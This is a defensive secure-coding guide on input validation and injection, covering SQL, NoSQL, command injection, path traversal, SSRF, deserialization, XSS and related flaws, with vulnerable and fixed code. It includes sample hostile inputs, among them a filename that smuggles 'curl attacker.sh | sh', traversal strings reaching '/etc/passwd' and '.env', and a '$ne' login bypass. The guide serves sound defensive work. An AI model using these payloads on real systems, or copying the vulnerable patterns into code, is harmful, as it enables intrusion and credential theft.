# Input validation and injection

Everything that crosses the trust boundary. Load when the codebase accepts any request body, query
param, path param, header, uploaded file, or webhook.

## Contents

- The rule
- Missing schema validation
- SQL injection
- NoSQL injection
- Command injection
- Path traversal
- SSRF
- Template and expression injection
- Deserialization
- XSS from the backend
- Regex denial of service
- Type confusion
- Webhook and third-party input

---

## The rule

Validate at the boundary, once, into a typed object. Every handler should turn raw request data into
a validated structure before any business logic runs. Sanitizing deep inside the code is how one path
gets missed.

Grep for handlers that read `req.body.x`, `request.data['x']`, `params[:x]`, `$_POST['x']`, or
`c.Query("x")` directly in the middle of logic — that is unvalidated input reaching a sink.

---

## Missing schema validation

**Signal:** No validation library in the dependency list, or one present but only used on some
routes. Handlers that destructure the body and use the values immediately.

**Why it breaks:** Missing fields become `undefined`/`None` and either crash the handler (500 that
leaks a stack trace) or write nulls into the database. Wrong types cause subtle corruption — a
quantity of `"5"` string vs `5`, a `limit` of `-1`, a `page` of `1e9`. Extra fields feed mass
assignment.

**Fix:** One schema per endpoint, applied before the handler body. Reject on failure with 400 and a
field-level message. Strip unknown keys rather than passing them through.

```ts
const CreateOrder = z.object({
  productId: z.string().uuid(),
  quantity:  z.number().int().min(1).max(100),
  note:      z.string().max(500).optional(),
}).strict();

const parsed = CreateOrder.safeParse(req.body);
if (!parsed.success) return res.status(400).json({ errors: parsed.error.flatten() });
```

Validate **every** source, not just the body: path params (`:id` must be a valid uuid/int before it
reaches the database), query params (`page`, `limit`, `sort`, `filter`), and headers you read.

Always bound `limit`. An unbounded `?limit=` is both a data-exposure and a denial-of-service vector.
Allowlist `sort` and `orderBy` values against a fixed set of column names — passing them into a query
is injection even through an ORM.

---

## SQL injection

**Signal:** Query text assembled with concatenation or interpolation.

```js
db.query(`SELECT * FROM users WHERE email = '${email}'`);
db.query("SELECT * FROM users WHERE id = " + id);
```
```python
cursor.execute(f"SELECT * FROM users WHERE email = '{email}'")
cursor.execute("SELECT * FROM users WHERE id = %s" % user_id)      # % is formatting, not binding
```
```php
$db->query("SELECT * FROM users WHERE email = '$email'");
```
```go
db.Query("SELECT * FROM users WHERE id = " + id)
```

**Why it breaks:** Full read and often full write of the database, sometimes command execution on the
database host. Critical, always.

**Fix:** Parameterized queries. The driver sends the query and the values separately, so no value can
change the query's meaning.

```js
db.query('SELECT * FROM users WHERE email = $1', [email]);      // pg
db.execute('SELECT * FROM users WHERE email = ?', [email]);     // mysql2
```
```python
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))   # comma makes it a bind
```
```go
db.Query("SELECT * FROM users WHERE id = $1", id)
```

**Escape hatches that reintroduce it:** `prisma.$queryRawUnsafe`, `sequelize.query` with
`replacements` omitted, SQLAlchemy `text()` with an f-string, Django `.extra()` and
`.raw()` with interpolation, ActiveRecord `where("name = '#{name}'")`, Knex `.whereRaw`. Grep for
each of these by name.

**Identifiers cannot be parameterized.** Table names, column names, `ORDER BY` targets, and
`ASC/DESC` must be validated against an allowlist:

```js
const SORTABLE = { name: 'name', created: 'created_at' };
const column = SORTABLE[req.query.sort] ?? 'created_at';
```

**Also check:** the database user has only the privileges it needs. An app connecting as `postgres`
or `root` turns a contained injection into a total compromise.

---

## NoSQL injection

**Signal:** A request value passed as a whole object into a query.

```js
db.users.findOne({ email: req.body.email, password: req.body.password });
```

**Why it breaks:** JSON bodies can contain objects. Posting
`{"email": "a@b.c", "password": {"$ne": null}}` matches any password. Query-string parsers can also
produce objects and arrays where you expected a string (`?email[$ne]=null`).

**Fix:** Coerce and validate types before querying — assert `typeof value === 'string'`, or run it
through a schema. Never pass raw body values as query operands. Where available, use a query builder
that treats values as literals. Do not use `$where`, `mapReduce`, or `$function` with any
user-derived input.

---

## Command injection

**Signal:** `exec(`, `execSync(`, `child_process.exec`, `os.system(`, `subprocess.run(..., shell=True)`,
`shell_exec`, `` ` ``, `Runtime.getRuntime().exec`, `exec.Command("sh", "-c", ...)` — with any
variable in the string.

**Why it breaks:** Remote code execution. A filename of `a.jpg; curl attacker.sh | sh` runs.

**Fix:** Use the array/argv form so there is no shell to inject into.

```js
execFile('convert', [input, '-resize', '100x100', output]);   // not exec(`convert ${input} ...`)
```
```python
subprocess.run(['convert', input_path, output_path], shell=False, check=True)
```

If a shell is genuinely unavoidable, allowlist the input against a strict pattern — do not attempt to
escape it. Never let user input choose the binary, and never pass user input as a flag (a value
starting with `-` becomes an option; prefix positional args with `--`).

---

## Path traversal

**Signal:** `path.join(dir, req.params.filename)`, `open(base + user_input)`, `fs.readFile` or
`sendFile` with a user-supplied name, `res.download(req.query.file)`.

**Why it breaks:** `../../../../etc/passwd` or `..\..\.env` escapes the directory and reads
arbitrary files — including your `.env`. URL-encoded (`%2e%2e%2f`) and double-encoded forms bypass
naive `..` string checks.

**Fix:** Do not build paths from user input at all where possible — store an id, look the real path
up in the database. When you must:

```js
const base = path.resolve('/srv/uploads');
const full = path.resolve(base, path.basename(userInput));
if (!full.startsWith(base + path.sep)) throw new Error('invalid path');
```

Resolve first, then verify containment. Strip directory components with `basename`. Allowlist the
extension. Reject null bytes.

---

## SSRF

**Signal:** `fetch(req.body.url)`, `axios.get(userUrl)`, `requests.get(url)`, an image-from-URL
importer, a webhook-testing feature, a PDF/screenshot renderer, or any "paste a link" flow.

**Why it breaks:** The server makes the request, so it reaches things the internet cannot: cloud
metadata endpoints (`169.254.169.254` → IAM credentials), internal admin panels, databases on
localhost, and other services in the private network.

**Fix:**
- Allowlist destinations by host if at all possible. That is the only reliable defense.
- Otherwise: resolve the hostname yourself, reject private, loopback, link-local, and reserved
  ranges (`127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`, `169.254/16`, `::1`, `fc00::/7`), then
  connect to the resolved IP — checking the hostname and then connecting by name is a TOCTOU hole
  (DNS rebinding).
- Do not follow redirects, or re-validate every hop.
- Allow only `http`/`https`; reject `file:`, `gopher:`, `ftp:`, `dict:`.
- Set a timeout and a response size cap.
- Do not return the raw upstream response body to the caller — that turns SSRF into a read primitive.
- Where the platform offers it, egress-restrict the service at the network level.

---

## Template and expression injection

**Signal:** A template compiled from a user-supplied string — `new Function`, `eval`, `vm.runInNewContext`,
Jinja `Template(user_input)`, Handlebars `compile(userInput)`, Thymeleaf/SpEL fed request data,
Twig `createTemplate`.

**Why it breaks:** Server-side template engines can reach the runtime. This is usually remote code
execution, not just output corruption.

**Fix:** Templates are code — they come from your repository. Pass user data as **variables** into a
fixed template. If users must supply templates, use a sandboxed logic-less engine and treat the
sandbox as best-effort.

---

## Deserialization

**Signal:** `pickle.loads`, `yaml.load` without `SafeLoader`, `JSON.parse` followed by prototype
merging, `unserialize()` in PHP, Java `ObjectInputStream`, .NET `BinaryFormatter`, `Marshal.load`
in Ruby — on data that came from a request, a cookie, a cache, or a queue.

**Why it breaks:** These formats can instantiate arbitrary objects and trigger code on load.

**Fix:** Use JSON for untrusted data. `yaml.safe_load`. Never unpickle untrusted bytes. If a signed
blob must round-trip through the client, sign it with HMAC and verify before parsing.

**Prototype pollution (JS):** a deep-merge or `lodash.merge` of an untrusted object can set
`__proto__`/`constructor.prototype` keys and change behavior application-wide. Reject those keys,
use `Object.create(null)` for maps, or `structuredClone` into a fresh object.

---

## XSS from the backend

**Signal:** A server-rendered template using `|safe`, `{!! !!}`, `dangerouslySetInnerHTML`,
`v-html`, `.innerHTML`, or `raw()` on stored user content. An API that stores HTML and a frontend
that renders it unescaped.

**Why it breaks:** Stored XSS runs in every viewer's session. If the auth token is readable from JS,
that is account takeover for everyone who views the content.

**Fix:** Escape on output, which every modern template engine does by default — do not disable it.
If users must submit rich text, sanitize with a maintained allowlist library (DOMPurify,
bleach, HTMLPurifier) at **render** time as well as store time. Set `Content-Type` correctly and
send `X-Content-Type-Options: nosniff`. A Content-Security-Policy limits the blast radius.

An API returning JSON is not automatically safe: if it is rendered by a frontend that trusts it,
the backend is still the source of the payload.

---

## Regex denial of service

**Signal:** A regex with nested quantifiers — `(a+)+`, `(\w*\s*)*`, `(.*,)*` — applied to
user input. Common in hand-written email/URL validators.

**Why it breaks:** Catastrophic backtracking. A crafted 40-character string pins a CPU core for
minutes and takes the process down with it.

**Fix:** Length-limit input before matching. Prefer a validation library over hand-rolled regex.
Avoid nested quantifiers. Use a linter that flags them (`eslint-plugin-security`, `bandit`).

---

## Type confusion

**Signal:** Comparisons with `==` in PHP/JS on user input. `parseInt` without a radix. Trusting
that a query parameter is a string.

**Why it breaks:** `"0e123" == "0e456"` is true in PHP loose comparison — a classic hash-comparison
bypass. In Express, `?id=1&id=2` makes `req.query.id` an array, and `?id[a]=b` makes it an object;
code expecting a string then behaves unpredictably or crashes.

**Fix:** Strict comparison (`===`, `hash_equals`). Assert types explicitly after parsing. Configure
the query parser to not build nested objects if you do not need them.

---

## Webhook and third-party input

**Signal:** A webhook handler that parses the body and acts on it with no signature check. Data from
a third-party API written to the database without validation.

**Why it breaks:** Anyone who learns the URL can forge events — mark orders paid, upgrade plans,
provision accounts. Third-party responses are also untrusted input; a compromised or changed upstream
can inject values you then store and render.

**Fix:** Verify the signature over the raw body before parsing (see `authentication.md`). Check the
event timestamp to block replay. Make handlers idempotent — providers retry, and processing the same
`event.id` twice must not double-charge or double-provision. Validate third-party payloads with the
same schemas you use for user input.
